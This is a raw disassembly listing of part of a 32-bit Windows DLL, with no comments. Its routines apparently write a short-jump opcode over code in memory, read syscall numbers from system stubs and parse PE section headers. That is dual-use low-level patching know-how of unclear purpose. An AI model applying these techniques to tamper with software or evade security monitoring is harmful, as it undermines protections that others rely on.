1000bc1a:	c9                   	leave
1000bc1b:	c3                   	ret
1000bc1c:	55                   	push   %ebp
1000bc1d:	8b ec                	mov    %esp,%ebp
1000bc1f:	6a ff                	push   $0xffffffff
1000bc21:	68 a8 e6 00 10       	push   $0x1000e6a8
1000bc26:	68 00 c6 00 10       	push   $0x1000c600
1000bc2b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000bc31:	50                   	push   %eax
1000bc32:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000bc39:	83 ec 18             	sub    $0x18,%esp
1000bc3c:	53                   	push   %ebx
1000bc3d:	56                   	push   %esi
1000bc3e:	57                   	push   %edi
1000bc3f:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000bc42:	8b 75 08             	mov    0x8(%ebp),%esi
1000bc45:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000bc49:	8b 4e 04             	mov    0x4(%esi),%ecx
1000bc4c:	89 4d e0             	mov    %ecx,-0x20(%ebp)
1000bc4f:	33 c0                	xor    %eax,%eax
1000bc51:	89 45 dc             	mov    %eax,-0x24(%ebp)
1000bc54:	83 f8 08             	cmp    $0x8,%eax
1000bc57:	73 0a                	jae    0x1000bc63
1000bc59:	8a 14 08             	mov    (%eax,%ecx,1),%dl
1000bc5c:	88 54 30 08          	mov    %dl,0x8(%eax,%esi,1)
1000bc60:	40                   	inc    %eax
1000bc61:	eb ee                	jmp    0x1000bc51
1000bc63:	6a 00                	push   $0x0
1000bc65:	6a 08                	push   $0x8
1000bc67:	8d 46 10             	lea    0x10(%esi),%eax
1000bc6a:	50                   	push   %eax
1000bc6b:	ff 76 04             	push   0x4(%esi)
1000bc6e:	8d 46 18             	lea    0x18(%esi),%eax
1000bc71:	50                   	push   %eax
1000bc72:	e8 1b 08 00 00       	call   0x1000c492
1000bc77:	83 c4 14             	add    $0x14,%esp
1000bc7a:	89 45 d8             	mov    %eax,-0x28(%ebp)
1000bc7d:	85 c0                	test   %eax,%eax
1000bc7f:	75 04                	jne    0x1000bc85
1000bc81:	c6 46 48 01          	movb   $0x1,0x48(%esi)
1000bc85:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000bc89:	eb 0e                	jmp    0x1000bc99
1000bc8b:	6a 01                	push   $0x1
1000bc8d:	58                   	pop    %eax
1000bc8e:	c3                   	ret
1000bc8f:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000bc92:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000bc96:	6a d5                	push   $0xffffffd5
1000bc98:	58                   	pop    %eax
1000bc99:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000bc9c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000bca3:	5f                   	pop    %edi
1000bca4:	5e                   	pop    %esi
1000bca5:	5b                   	pop    %ebx
1000bca6:	c9                   	leave
1000bca7:	c3                   	ret
1000bca8:	55                   	push   %ebp
1000bca9:	8b ec                	mov    %esp,%ebp
1000bcab:	6a ff                	push   $0xffffffff
1000bcad:	68 b8 e6 00 10       	push   $0x1000e6b8
1000bcb2:	68 00 c6 00 10       	push   $0x1000c600
1000bcb7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000bcbd:	50                   	push   %eax
1000bcbe:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000bcc5:	83 ec 10             	sub    $0x10,%esp
1000bcc8:	53                   	push   %ebx
1000bcc9:	56                   	push   %esi
1000bcca:	57                   	push   %edi
1000bccb:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000bcce:	8b 75 08             	mov    0x8(%ebp),%esi
1000bcd1:	83 fe 0a             	cmp    $0xa,%esi
1000bcd4:	73 07                	jae    0x1000bcdd
1000bcd6:	b8 61 00 00 c0       	mov    $0xc0000061,%eax
1000bcdb:	eb 33                	jmp    0x1000bd10
1000bcdd:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000bce1:	56                   	push   %esi
1000bce2:	e8 38 00 00 00       	call   0x1000bd1f
1000bce7:	56                   	push   %esi
1000bce8:	e8 ac 00 00 00       	call   0x1000bd99
1000bced:	ff 76 44             	push   0x44(%esi)
1000bcf0:	ff 76 40             	push   0x40(%esi)
1000bcf3:	8d 46 18             	lea    0x18(%esi),%eax
1000bcf6:	50                   	push   %eax
1000bcf7:	ff 16                	call   *(%esi)
1000bcf9:	83 c4 14             	add    $0x14,%esp
1000bcfc:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000bd00:	eb 0e                	jmp    0x1000bd10
1000bd02:	6a 01                	push   $0x1
1000bd04:	58                   	pop    %eax
1000bd05:	c3                   	ret
1000bd06:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000bd09:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000bd0d:	6a d5                	push   $0xffffffd5
1000bd0f:	58                   	pop    %eax
1000bd10:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000bd13:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000bd1a:	5f                   	pop    %edi
1000bd1b:	5e                   	pop    %esi
1000bd1c:	5b                   	pop    %ebx
1000bd1d:	c9                   	leave
1000bd1e:	c3                   	ret
1000bd1f:	55                   	push   %ebp
1000bd20:	8b ec                	mov    %esp,%ebp
1000bd22:	6a ff                	push   $0xffffffff
1000bd24:	68 c8 e6 00 10       	push   $0x1000e6c8
1000bd29:	68 00 c6 00 10       	push   $0x1000c600
1000bd2e:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000bd34:	50                   	push   %eax
1000bd35:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000bd3c:	83 ec 10             	sub    $0x10,%esp
1000bd3f:	53                   	push   %ebx
1000bd40:	56                   	push   %esi
1000bd41:	57                   	push   %edi
1000bd42:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000bd45:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000bd49:	6a 00                	push   $0x0
1000bd4b:	6a 08                	push   $0x8
1000bd4d:	8b 75 08             	mov    0x8(%ebp),%esi
1000bd50:	8d 46 08             	lea    0x8(%esi),%eax
1000bd53:	50                   	push   %eax
1000bd54:	ff 76 04             	push   0x4(%esi)
1000bd57:	8d 46 18             	lea    0x18(%esi),%eax
1000bd5a:	50                   	push   %eax
1000bd5b:	e8 32 07 00 00       	call   0x1000c492
1000bd60:	83 c4 14             	add    $0x14,%esp
1000bd63:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000bd66:	85 c0                	test   %eax,%eax
1000bd68:	74 06                	je     0x1000bd70
1000bd6a:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000bd6e:	eb 1a                	jmp    0x1000bd8a
1000bd70:	c6 46 49 01          	movb   $0x1,0x49(%esi)
1000bd74:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000bd78:	33 c0                	xor    %eax,%eax
1000bd7a:	eb 0e                	jmp    0x1000bd8a
1000bd7c:	6a 01                	push   $0x1
1000bd7e:	58                   	pop    %eax
1000bd7f:	c3                   	ret
1000bd80:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000bd83:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000bd87:	6a d5                	push   $0xffffffd5
1000bd89:	58                   	pop    %eax
1000bd8a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000bd8d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000bd94:	5f                   	pop    %edi
1000bd95:	5e                   	pop    %esi
1000bd96:	5b                   	pop    %ebx
1000bd97:	c9                   	leave
1000bd98:	c3                   	ret
1000bd99:	55                   	push   %ebp
1000bd9a:	8b ec                	mov    %esp,%ebp
1000bd9c:	6a ff                	push   $0xffffffff
1000bd9e:	68 d8 e6 00 10       	push   $0x1000e6d8
1000bda3:	68 00 c6 00 10       	push   $0x1000c600
1000bda8:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000bdae:	50                   	push   %eax
1000bdaf:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000bdb6:	83 ec 18             	sub    $0x18,%esp
1000bdb9:	53                   	push   %ebx
1000bdba:	56                   	push   %esi
1000bdbb:	57                   	push   %edi
1000bdbc:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000bdbf:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000bdc3:	8b 45 08             	mov    0x8(%ebp),%eax
1000bdc6:	8b 48 2c             	mov    0x2c(%eax),%ecx
1000bdc9:	89 4d e0             	mov    %ecx,-0x20(%ebp)
1000bdcc:	85 c9                	test   %ecx,%ecx
1000bdce:	74 26                	je     0x1000bdf6
1000bdd0:	c6 45 dc eb          	movb   $0xeb,-0x24(%ebp)
1000bdd4:	6a 00                	push   $0x0
1000bdd6:	6a 01                	push   $0x1
1000bdd8:	8d 55 dc             	lea    -0x24(%ebp),%edx
1000bddb:	52                   	push   %edx
1000bddc:	51                   	push   %ecx
1000bddd:	83 c0 18             	add    $0x18,%eax
1000bde0:	50                   	push   %eax
1000bde1:	e8 ac 06 00 00       	call   0x1000c492
1000bde6:	83 c4 14             	add    $0x14,%esp
1000bde9:	89 45 d8             	mov    %eax,-0x28(%ebp)
1000bdec:	85 c0                	test   %eax,%eax
1000bdee:	74 06                	je     0x1000bdf6
1000bdf0:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000bdf4:	eb 16                	jmp    0x1000be0c
1000bdf6:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000bdfa:	33 c0                	xor    %eax,%eax
1000bdfc:	eb 0e                	jmp    0x1000be0c
1000bdfe:	6a 01                	push   $0x1
1000be00:	58                   	pop    %eax
1000be01:	c3                   	ret
1000be02:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000be05:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000be09:	6a d5                	push   $0xffffffd5
1000be0b:	58                   	pop    %eax
1000be0c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000be0f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000be16:	5f                   	pop    %edi
1000be17:	5e                   	pop    %esi
1000be18:	5b                   	pop    %ebx
1000be19:	c9                   	leave
1000be1a:	c3                   	ret
1000be1b:	53                   	push   %ebx
1000be1c:	56                   	push   %esi
1000be1d:	8b 74 24 0c          	mov    0xc(%esp),%esi
1000be21:	57                   	push   %edi
1000be22:	85 f6                	test   %esi,%esi
1000be24:	74 3b                	je     0x1000be61
1000be26:	83 7c 24 14 00       	cmpl   $0x0,0x14(%esp)
1000be2b:	74 34                	je     0x1000be61
1000be2d:	8d 7e 18             	lea    0x18(%esi),%edi
1000be30:	68 14 05 01 10       	push   $0x10010514
1000be35:	57                   	push   %edi
1000be36:	e8 2e dd ff ff       	call   0x10009b69
1000be3b:	8b d8                	mov    %eax,%ebx
1000be3d:	59                   	pop    %ecx
1000be3e:	85 db                	test   %ebx,%ebx
1000be40:	59                   	pop    %ecx
1000be41:	74 1e                	je     0x1000be61
1000be43:	68 40 05 01 10       	push   $0x10010540
1000be48:	57                   	push   %edi
1000be49:	e8 1b dd ff ff       	call   0x10009b69
1000be4e:	59                   	pop    %ecx
1000be4f:	85 c0                	test   %eax,%eax
1000be51:	59                   	pop    %ecx
1000be52:	74 0d                	je     0x1000be61
1000be54:	8b 4c 24 14          	mov    0x14(%esp),%ecx
1000be58:	89 01                	mov    %eax,(%ecx)
1000be5a:	89 5e 04             	mov    %ebx,0x4(%esi)
1000be5d:	b0 01                	mov    $0x1,%al
1000be5f:	eb 02                	jmp    0x1000be63
1000be61:	32 c0                	xor    %al,%al
1000be63:	5f                   	pop    %edi
1000be64:	5e                   	pop    %esi
1000be65:	5b                   	pop    %ebx
1000be66:	c3                   	ret
1000be67:	55                   	push   %ebp
1000be68:	8b ec                	mov    %esp,%ebp
1000be6a:	83 ec 14             	sub    $0x14,%esp
1000be6d:	6a 14                	push   $0x14
1000be6f:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000be72:	6a 00                	push   $0x0
1000be74:	50                   	push   %eax
1000be75:	e8 9c 14 00 00       	call   0x1000d316
1000be7a:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000be7d:	50                   	push   %eax
1000be7e:	ff 75 08             	push   0x8(%ebp)
1000be81:	e8 34 01 00 00       	call   0x1000bfba
1000be86:	83 c4 14             	add    $0x14,%esp
1000be89:	85 c0                	test   %eax,%eax
1000be8b:	75 28                	jne    0x1000beb5
1000be8d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000be90:	8b 55 ec             	mov    -0x14(%ebp),%edx
1000be93:	89 11                	mov    %edx,(%ecx)
1000be95:	8b 4d 10             	mov    0x10(%ebp),%ecx
1000be98:	8b 55 f0             	mov    -0x10(%ebp),%edx
1000be9b:	89 11                	mov    %edx,(%ecx)
1000be9d:	8b 4d 14             	mov    0x14(%ebp),%ecx
1000bea0:	8b 55 f4             	mov    -0xc(%ebp),%edx
1000bea3:	89 11                	mov    %edx,(%ecx)
1000bea5:	8b 4d 18             	mov    0x18(%ebp),%ecx
1000bea8:	8b 55 f8             	mov    -0x8(%ebp),%edx
1000beab:	89 11                	mov    %edx,(%ecx)
1000bead:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
1000beb0:	8b 55 fc             	mov    -0x4(%ebp),%edx
1000beb3:	89 11                	mov    %edx,(%ecx)
1000beb5:	c9                   	leave
1000beb6:	c3                   	ret
1000beb7:	56                   	push   %esi
1000beb8:	68 1c 06 01 10       	push   $0x1001061c
1000bebd:	e8 2e 00 00 00       	call   0x1000bef0
1000bec2:	8b f0                	mov    %eax,%esi
1000bec4:	c7 04 24 0c 06 01 10 	movl   $0x1001060c,(%esp)
1000becb:	e8 20 00 00 00       	call   0x1000bef0
1000bed0:	85 f6                	test   %esi,%esi
1000bed2:	59                   	pop    %ecx
1000bed3:	74 16                	je     0x1000beeb
1000bed5:	85 c0                	test   %eax,%eax
1000bed7:	74 12                	je     0x1000beeb
1000bed9:	8b 4c 24 08          	mov    0x8(%esp),%ecx
1000bedd:	40                   	inc    %eax
1000bede:	46                   	inc    %esi
1000bedf:	89 01                	mov    %eax,(%ecx)
1000bee1:	8b 44 24 0c          	mov    0xc(%esp),%eax
1000bee5:	89 30                	mov    %esi,(%eax)
1000bee7:	33 c0                	xor    %eax,%eax
1000bee9:	5e                   	pop    %esi
1000beea:	c3                   	ret
1000beeb:	6a d4                	push   $0xffffffd4
1000beed:	58                   	pop    %eax
1000beee:	5e                   	pop    %esi
1000beef:	c3                   	ret
1000bef0:	55                   	push   %ebp
1000bef1:	8b ec                	mov    %esp,%ebp
1000bef3:	6a ff                	push   $0xffffffff
1000bef5:	68 b8 ee 00 10       	push   $0x1000eeb8
1000befa:	68 00 c6 00 10       	push   $0x1000c600
1000beff:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000bf05:	50                   	push   %eax
1000bf06:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000bf0d:	83 ec 1c             	sub    $0x1c,%esp
1000bf10:	53                   	push   %ebx
1000bf11:	56                   	push   %esi
1000bf12:	57                   	push   %edi
1000bf13:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000bf16:	68 30 06 01 10       	push   $0x10010630
1000bf1b:	ff 15 08 e1 00 10    	call   *0x1000e108
1000bf21:	89 45 e4             	mov    %eax,-0x1c(%ebp)
1000bf24:	33 db                	xor    %ebx,%ebx
1000bf26:	3b c3                	cmp    %ebx,%eax
1000bf28:	74 75                	je     0x1000bf9f
1000bf2a:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000bf2d:	ff 75 08             	push   0x8(%ebp)
1000bf30:	50                   	push   %eax
1000bf31:	ff 15 1c e1 00 10    	call   *0x1000e11c
1000bf37:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000bf3a:	3b c3                	cmp    %ebx,%eax
1000bf3c:	75 04                	jne    0x1000bf42
1000bf3e:	33 f6                	xor    %esi,%esi
1000bf40:	eb 2a                	jmp    0x1000bf6c
1000bf42:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
1000bf49:	89 5d dc             	mov    %ebx,-0x24(%ebp)
1000bf4c:	83 7d dc 0a          	cmpl   $0xa,-0x24(%ebp)
1000bf50:	7d 34                	jge    0x1000bf86
1000bf52:	80 38 b8             	cmpb   $0xb8,(%eax)
1000bf55:	75 26                	jne    0x1000bf7d
1000bf57:	38 58 03             	cmp    %bl,0x3(%eax)
1000bf5a:	75 21                	jne    0x1000bf7d
1000bf5c:	38 58 04             	cmp    %bl,0x4(%eax)
1000bf5f:	75 1c                	jne    0x1000bf7d
1000bf61:	40                   	inc    %eax
1000bf62:	89 45 d4             	mov    %eax,-0x2c(%ebp)
1000bf65:	8b 00                	mov    (%eax),%eax
1000bf67:	89 45 d8             	mov    %eax,-0x28(%ebp)
1000bf6a:	8b f0                	mov    %eax,%esi
1000bf6c:	6a ff                	push   $0xffffffff
1000bf6e:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000bf71:	50                   	push   %eax
1000bf72:	e8 5f 15 00 00       	call   0x1000d4d6
1000bf77:	59                   	pop    %ecx
1000bf78:	59                   	pop    %ecx
1000bf79:	8b c6                	mov    %esi,%eax
1000bf7b:	eb 24                	jmp    0x1000bfa1
1000bf7d:	40                   	inc    %eax
1000bf7e:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000bf81:	ff 45 dc             	incl   -0x24(%ebp)
1000bf84:	eb c6                	jmp    0x1000bf4c
1000bf86:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000bf89:	eb 0b                	jmp    0x1000bf96
1000bf8b:	6a 01                	push   $0x1
1000bf8d:	58                   	pop    %eax
1000bf8e:	c3                   	ret
1000bf8f:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000bf92:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000bf96:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000bf9a:	e8 11 00 00 00       	call   0x1000bfb0
1000bf9f:	33 c0                	xor    %eax,%eax
1000bfa1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000bfa4:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000bfab:	5f                   	pop    %edi
1000bfac:	5e                   	pop    %esi
1000bfad:	5b                   	pop    %ebx
1000bfae:	c9                   	leave
1000bfaf:	c3                   	ret
1000bfb0:	ff 75 e4             	push   -0x1c(%ebp)
1000bfb3:	ff 15 98 e0 00 10    	call   *0x1000e098
1000bfb9:	c3                   	ret
1000bfba:	55                   	push   %ebp
1000bfbb:	8b ec                	mov    %esp,%ebp
1000bfbd:	83 ec 18             	sub    $0x18,%esp
1000bfc0:	53                   	push   %ebx
1000bfc1:	56                   	push   %esi
1000bfc2:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000bfc5:	57                   	push   %edi
1000bfc6:	50                   	push   %eax
1000bfc7:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000bfca:	50                   	push   %eax
1000bfcb:	33 f6                	xor    %esi,%esi
1000bfcd:	ff 75 08             	push   0x8(%ebp)
1000bfd0:	89 75 f4             	mov    %esi,-0xc(%ebp)
1000bfd3:	89 75 f8             	mov    %esi,-0x8(%ebp)
1000bfd6:	e8 a2 04 00 00       	call   0x1000c47d
1000bfdb:	83 c4 0c             	add    $0xc,%esp
1000bfde:	3b c6                	cmp    %esi,%eax
1000bfe0:	89 45 e8             	mov    %eax,-0x18(%ebp)
1000bfe3:	0f 85 18 01 00 00    	jne    0x1000c101
1000bfe9:	8b 45 f4             	mov    -0xc(%ebp),%eax
1000bfec:	80 65 ff 00          	andb   $0x0,-0x1(%ebp)
1000bff0:	89 75 ec             	mov    %esi,-0x14(%ebp)
1000bff3:	32 db                	xor    %bl,%bl
1000bff5:	66 39 70 06          	cmp    %si,0x6(%eax)
1000bff9:	89 75 e8             	mov    %esi,-0x18(%ebp)
1000bffc:	89 75 f0             	mov    %esi,-0x10(%ebp)
1000bfff:	76 7b                	jbe    0x1000c07c
1000c001:	8b 3d 90 e1 00 10    	mov    0x1000e190,%edi
1000c007:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000c00a:	6a 08                	push   $0x8
1000c00c:	03 c6                	add    %esi,%eax
1000c00e:	68 5c 06 01 10       	push   $0x1001065c
1000c013:	50                   	push   %eax
1000c014:	ff d7                	call   *%edi
1000c016:	83 c4 0c             	add    $0xc,%esp
1000c019:	85 c0                	test   %eax,%eax
1000c01b:	75 14                	jne    0x1000c031
1000c01d:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000c020:	b3 01                	mov    $0x1,%bl
1000c022:	8d 0c 06             	lea    (%esi,%eax,1),%ecx
1000c025:	8b 44 06 0c          	mov    0xc(%esi,%eax,1),%eax
1000c029:	2b 41 14             	sub    0x14(%ecx),%eax
1000c02c:	89 45 e8             	mov    %eax,-0x18(%ebp)
1000c02f:	eb 28                	jmp    0x1000c059
1000c031:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000c034:	6a 08                	push   $0x8
1000c036:	03 c6                	add    %esi,%eax
1000c038:	68 54 06 01 10       	push   $0x10010654
1000c03d:	50                   	push   %eax
1000c03e:	ff d7                	call   *%edi
1000c040:	83 c4 0c             	add    $0xc,%esp
1000c043:	85 c0                	test   %eax,%eax
1000c045:	75 0e                	jne    0x1000c055
1000c047:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000c04a:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
1000c04e:	8b 44 06 14          	mov    0x14(%esi,%eax,1),%eax
1000c052:	89 45 ec             	mov    %eax,-0x14(%ebp)
1000c055:	84 db                	test   %bl,%bl
1000c057:	74 06                	je     0x1000c05f
1000c059:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
1000c05d:	75 14                	jne    0x1000c073
1000c05f:	8b 45 f4             	mov    -0xc(%ebp),%eax
1000c062:	ff 45 f0             	incl   -0x10(%ebp)
1000c065:	83 c6 28             	add    $0x28,%esi
1000c068:	0f b7 48 06          	movzwl 0x6(%eax),%ecx
1000c06c:	39 4d f0             	cmp    %ecx,-0x10(%ebp)
1000c06f:	72 96                	jb     0x1000c007
1000c071:	eb 03                	jmp    0x1000c076
1000c073:	8b 45 f4             	mov    -0xc(%ebp),%eax
1000c076:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
1000c07a:	75 16                	jne    0x1000c092
1000c07c:	8b 35 c0 e0 00 10    	mov    0x1000e0c0,%esi
1000c082:	50                   	push   %eax
1000c083:	ff d6                	call   *%esi
1000c085:	ff 75 f8             	push   -0x8(%ebp)
1000c088:	ff d6                	call   *%esi
1000c08a:	6a f1                	push   $0xfffffff1
1000c08c:	58                   	pop    %eax
1000c08d:	e9 83 00 00 00       	jmp    0x1000c115
1000c092:	8b 75 0c             	mov    0xc(%ebp),%esi
1000c095:	8b 40 34             	mov    0x34(%eax),%eax
1000c098:	03 45 e8             	add    -0x18(%ebp),%eax
1000c09b:	8d 5e 10             	lea    0x10(%esi),%ebx
1000c09e:	8d 4e 0c             	lea    0xc(%esi),%ecx
1000c0a1:	8d 56 08             	lea    0x8(%esi),%edx
1000c0a4:	53                   	push   %ebx
1000c0a5:	8d 7e 04             	lea    0x4(%esi),%edi
1000c0a8:	51                   	push   %ecx
1000c0a9:	52                   	push   %edx
1000c0aa:	57                   	push   %edi
1000c0ab:	56                   	push   %esi
1000c0ac:	50                   	push   %eax
1000c0ad:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000c0b0:	89 4d f0             	mov    %ecx,-0x10(%ebp)
1000c0b3:	50                   	push   %eax
1000c0b4:	89 55 0c             	mov    %edx,0xc(%ebp)
1000c0b7:	ff 75 08             	push   0x8(%ebp)
1000c0ba:	e8 5b 00 00 00       	call   0x1000c11a
1000c0bf:	83 c4 20             	add    $0x20,%esp
1000c0c2:	89 45 e8             	mov    %eax,-0x18(%ebp)
1000c0c5:	85 c0                	test   %eax,%eax
1000c0c7:	75 38                	jne    0x1000c101
1000c0c9:	b8 00 10 00 00       	mov    $0x1000,%eax
1000c0ce:	68 48 06 01 10       	push   $0x10010648
1000c0d3:	01 06                	add    %eax,(%esi)
1000c0d5:	01 07                	add    %eax,(%edi)
1000c0d7:	e8 56 08 00 00       	call   0x1000c932
1000c0dc:	59                   	pop    %ecx
1000c0dd:	8b 4d f4             	mov    -0xc(%ebp),%ecx
1000c0e0:	8b 51 34             	mov    0x34(%ecx),%edx
1000c0e3:	3b c2                	cmp    %edx,%eax
1000c0e5:	74 1d                	je     0x1000c104
1000c0e7:	8b f0                	mov    %eax,%esi
1000c0e9:	2b f2                	sub    %edx,%esi
1000c0eb:	8b 55 0c             	mov    0xc(%ebp),%edx
1000c0ee:	01 32                	add    %esi,(%edx)
1000c0f0:	8b 55 f0             	mov    -0x10(%ebp),%edx
1000c0f3:	8b f0                	mov    %eax,%esi
1000c0f5:	2b 71 34             	sub    0x34(%ecx),%esi
1000c0f8:	01 32                	add    %esi,(%edx)
1000c0fa:	2b 41 34             	sub    0x34(%ecx),%eax
1000c0fd:	01 03                	add    %eax,(%ebx)
1000c0ff:	eb 03                	jmp    0x1000c104
1000c101:	8b 4d f4             	mov    -0xc(%ebp),%ecx
1000c104:	8b 35 c0 e0 00 10    	mov    0x1000e0c0,%esi
1000c10a:	51                   	push   %ecx
1000c10b:	ff d6                	call   *%esi
1000c10d:	ff 75 f8             	push   -0x8(%ebp)
1000c110:	ff d6                	call   *%esi
1000c112:	8b 45 e8             	mov    -0x18(%ebp),%eax
1000c115:	5f                   	pop    %edi
1000c116:	5e                   	pop    %esi
1000c117:	5b                   	pop    %ebx
1000c118:	c9                   	leave
1000c119:	c3                   	ret
1000c11a:	55                   	push   %ebp
1000c11b:	8b ec                	mov    %esp,%ebp
1000c11d:	6a ff                	push   $0xffffffff
1000c11f:	68 d0 ee 00 10       	push   $0x1000eed0
1000c124:	68 00 c6 00 10       	push   $0x1000c600
1000c129:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000c12f:	50                   	push   %eax
1000c130:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000c137:	83 ec 2c             	sub    $0x2c,%esp
1000c13a:	53                   	push   %ebx
1000c13b:	56                   	push   %esi
1000c13c:	57                   	push   %edi
1000c13d:	33 db                	xor    %ebx,%ebx
1000c13f:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
1000c142:	6a 10                	push   $0x10
1000c144:	53                   	push   %ebx
1000c145:	8d 45 d4             	lea    -0x2c(%ebp),%eax
1000c148:	50                   	push   %eax
1000c149:	e8 c8 11 00 00       	call   0x1000d316
1000c14e:	8d 45 d4             	lea    -0x2c(%ebp),%eax
1000c151:	50                   	push   %eax
1000c152:	ff 75 08             	push   0x8(%ebp)
1000c155:	e8 55 07 00 00       	call   0x1000c8af
1000c15a:	83 c4 14             	add    $0x14,%esp
1000c15d:	84 c0                	test   %al,%al
1000c15f:	75 08                	jne    0x1000c169
1000c161:	6a d2                	push   $0xffffffd2
1000c163:	58                   	pop    %eax
1000c164:	e9 9c 00 00 00       	jmp    0x1000c205
1000c169:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000c16c:	ff 15 dc e0 00 10    	call   *0x1000e0dc
1000c172:	89 45 cc             	mov    %eax,-0x34(%ebp)
1000c175:	0f b6 c0             	movzbl %al,%eax
1000c178:	89 45 c8             	mov    %eax,-0x38(%ebp)
1000c17b:	33 c9                	xor    %ecx,%ecx
1000c17d:	8a 4d cd             	mov    -0x33(%ebp),%cl
1000c180:	0f b6 c9             	movzbl %cl,%ecx
1000c183:	89 4d d0             	mov    %ecx,-0x30(%ebp)
1000c186:	83 f8 04             	cmp    $0x4,%eax
1000c189:	77 1e                	ja     0x1000c1a9
1000c18b:	ff 75 14             	push   0x14(%ebp)
1000c18e:	ff 75 18             	push   0x18(%ebp)
1000c191:	ff 75 10             	push   0x10(%ebp)
1000c194:	8b 7d 0c             	mov    0xc(%ebp),%edi
1000c197:	57                   	push   %edi
1000c198:	8d 45 d4             	lea    -0x2c(%ebp),%eax
1000c19b:	50                   	push   %eax
1000c19c:	e8 96 00 00 00       	call   0x1000c237
1000c1a1:	83 c4 14             	add    $0x14,%esp
1000c1a4:	89 45 e4             	mov    %eax,-0x1c(%ebp)
1000c1a7:	eb 0a                	jmp    0x1000c1b3
1000c1a9:	c7 45 e4 be ff ff ff 	movl   $0xffffffbe,-0x1c(%ebp)
1000c1b0:	8b 7d 0c             	mov    0xc(%ebp),%edi
1000c1b3:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
1000c1b6:	75 69                	jne    0x1000c221
1000c1b8:	8b 45 18             	mov    0x18(%ebp),%eax
1000c1bb:	8b 30                	mov    (%eax),%esi
1000c1bd:	89 75 c4             	mov    %esi,-0x3c(%ebp)
1000c1c0:	ff 75 20             	push   0x20(%ebp)
1000c1c3:	56                   	push   %esi
1000c1c4:	ff 37                	push   (%edi)
1000c1c6:	8d 45 d4             	lea    -0x2c(%ebp),%eax
1000c1c9:	50                   	push   %eax
1000c1ca:	e8 85 02 00 00       	call   0x1000c454
1000c1cf:	83 c4 10             	add    $0x10,%esp
1000c1d2:	89 45 e4             	mov    %eax,-0x1c(%ebp)
1000c1d5:	3b c3                	cmp    %ebx,%eax
1000c1d7:	75 1c                	jne    0x1000c1f5
1000c1d9:	ff 75 24             	push   0x24(%ebp)
1000c1dc:	8d 46 01             	lea    0x1(%esi),%eax
1000c1df:	50                   	push   %eax
1000c1e0:	ff 37                	push   (%edi)
1000c1e2:	8d 45 d4             	lea    -0x2c(%ebp),%eax
1000c1e5:	50                   	push   %eax
